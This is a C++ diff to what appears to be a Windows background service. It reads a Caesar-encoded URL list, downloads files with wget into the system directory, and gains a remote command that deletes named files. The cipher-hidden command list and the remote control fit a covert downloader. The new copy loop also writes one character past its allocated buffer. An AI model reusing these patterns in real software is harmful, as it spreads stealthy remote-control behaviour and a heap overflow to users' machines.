@@ -26,6 +26,11 @@ TCHAR WGET_ARGS_LAST[] =		// with first and last space
 int URLS_TIME = conf_urls_time;
 TCHAR URLS_PATH[] = _T(conf_urls_path);
 
+// path for DELETE command
+TCHAR *DEL_PATH;
+TCHAR DEL_PATH_FIRST[] = _T("\\\\?\\");
+TCHAR DEL_PATH_LAST[] = _T(conf_wget_dir_prefix) _T("\\");
+
 // active URLs
 int AURLS_MAX_COUNT = conf_downloads_max_count;	// maximum number of active URLs (i.e. concurrent downloads)
 
@@ -162,27 +167,62 @@ void __stdcall reload_url_list(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwT
 			int line_len = (int)(p - pbase);
 
 			// copy and decode line
-			char *line = new char [line_len];
+			char *line = new char [line_len + 1];
 			memcpy(line, pbase, line_len);
 			caesar_decode(line, line_len, (char)conf_caesar_key);
+			line[line_len] = 0;	// null char for asciiz
+
+			// set new base and offset for the next line
+			p++;
+			pbase = p+1;
+
+			// check if it's DELETE instruction instead of just link
+			if (line[0] == '#')
+			{
+				// find last slash in line
+				char *slash = line;
+				char *slash_next;
+				while ( slash_next = strstr(slash+1, "/") )
+					slash = slash_next;
+
+				// if slash has been found
+				if (slash != line)
+				{
+					// get filename
+					if (line[1] == '"')
+						line[line_len-1] = 0;
+					slash++;
+					size_t slash_len = strlen(slash);
+					TCHAR *filepath = new TCHAR [_tcslen(DEL_PATH) + slash_len + 1];
+					filepath[0] = 0;
+					_tcscat(filepath, DEL_PATH);
+					TCHAR *file_itself = filepath + _tcslen(DEL_PATH);
+					for (i=0; i < slash_len+1; i++)
+						file_itself[i] = (TCHAR)slash[i];
+
+					// delete this file
+					DeleteFile(filepath);
+
+					delete [] filepath;
+				}
+
+				// look for the next line
+				delete [] line;
+				continue;
+			}
 
 			// first part: add wget args to url
-			TCHAR *url = new TCHAR [ _tcslen(WGET_ARGS) + line_len + 1 ];
+			TCHAR *url = new TCHAR [ _tcslen(WGET_ARGS) + line_len ];
 			url[0] = 0;
 			_tcscat(url, WGET_ARGS);
 
 			// second part: add url itself
 			TCHAR *url_itself = url + _tcslen(WGET_ARGS);
-			for (i=0; i<line_len; i++)
+			for (i=0; i < line_len+1; i++)
 				url_itself[i] = (TCHAR)line[i];
-			url_itself[i] = 0;
 
 			// free decoded line
 			delete [] line;
-
-			// set new base and offset for the next line
-			p += 2;
-			pbase = p;
 
 			// check if it's already active URL
 			bool new_url = true;
@@ -279,6 +319,19 @@ void __stdcall wget_sv_main()
 	_tcscat(WGET_ARGS, sys_dir);
 	_tcscat(WGET_ARGS, WGET_DIR_PREFIX_LAST);
 	_tcscat(WGET_ARGS, WGET_ARGS_LAST);
+
+	// get full path for DELETE command
+	DEL_PATH = new TCHAR	[
+								_tcslen(DEL_PATH_FIRST) +
+								_tcslen(sys_dir) +
+								_tcslen(DEL_PATH_LAST) +
+								1
+							];
+	DEL_PATH[0] = 0;
+	_tcscat(DEL_PATH, DEL_PATH_FIRST);
+	_tcscat(DEL_PATH, sys_dir);
+	_tcscat(DEL_PATH, DEL_PATH_LAST);
+
 
 	
 	// set timer to reread URLs list from file
